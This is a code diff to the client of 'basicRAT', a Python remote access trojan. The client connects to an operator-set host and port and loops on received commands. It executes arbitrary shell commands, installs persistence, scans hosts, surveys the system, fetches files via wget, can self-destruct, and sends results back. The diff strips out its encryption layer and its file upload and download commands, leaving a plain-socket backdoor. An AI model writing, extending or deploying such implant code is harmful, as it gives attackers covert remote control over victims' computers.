@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 #
 # basicRAT client
@@ -10,7 +9,7 @@ import socket
 import subprocess
 import sys
 
-from core import common, crypto, persistence, scan, survey, toolkit
+from core import persistence, scan, survey, toolkit
 
 
 # change these to suit your needs
@@ -33,26 +32,16 @@ def main():
     # connect to basicRAT server
     conn = socket.socket()
     conn.connect((HOST, PORT))
-    client = common.Client(conn, HOST, 1)
+    # conn.setblocking(0)
 
     while True:
-        results = ''
-
         # wait to receive data from server
-        data = client.recvGCM()
-
-        # don't process empty data
-        if not data:
-            continue
+        data = conn.recv(4096)
 
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
 
-        if cmd == 'download':
-            client.sendfile(action.rstrip())
-            continue
-
-        elif cmd == 'execute':
+        if cmd == 'execute':
             results = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
@@ -65,16 +54,8 @@ def main():
         elif cmd == 'persistence':
             results = persistence.run(plat)
 
-        # elif cmd == 'rekey':
-        #    client.dh_key = crypto.diffiehellman(client.conn)
-        #    continue
-
         elif cmd == 'scan':
             results = scan.single_host(action)
-
-        elif cmd == 'selfdestruct':
-            conn.close()
-            toolkit.selfdestruct(plat)
 
         elif cmd == 'survey':
             results = survey.run(plat)
@@ -82,14 +63,14 @@ def main():
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
 
-        elif cmd == 'upload':
-            client.recvfile(action.rstrip())
-            continue
-
         elif cmd == 'wget':
             results = toolkit.wget(action)
 
-        client.sendGCM(results)
+        elif cmd == 'selfdestruct':
+            conn.close()
+            toolkit.selfdestruct(plat)
+
+        conn.send(results)
 
 
 if __name__ == '__main__':
